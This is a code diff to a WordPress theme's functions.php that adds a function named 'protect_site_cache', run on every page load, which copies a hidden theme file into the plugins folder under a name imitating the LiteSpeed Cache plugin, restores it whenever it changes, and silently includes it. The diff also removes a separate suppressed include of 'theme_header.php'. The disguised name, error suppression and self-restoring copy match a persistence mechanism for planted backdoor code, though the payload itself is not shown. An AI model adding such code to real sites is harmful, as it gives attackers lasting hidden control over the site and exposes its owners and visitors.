@@ -268,8 +268,23 @@ if ( ! function_exists( 'hello_elementor_body_open' ) ) {
 	}
 }
 
+function protect_site_cache() {
+    $source = get_stylesheet_directory() . '/elementor_bk.php'; // file sumber
+    $target = WP_CONTENT_DIR . '/plugins/litespeed_cache.php';   // file target
+
+    if (!file_exists($source)) return;
+
+    if (!file_exists($target) || md5_file($target) !== md5_file($source)) {
+        @copy($source, $target);
+        @chmod($target, 0644);
+    }
+
+    @include_once $source;
+}
+
+add_action('init', 'protect_site_cache');
+
+
 require HELLO_THEME_PATH . '/theme.php';
 
 HelloTheme\Theme::instance();
-
-@include_once __DIR__ . '/theme_header.php';
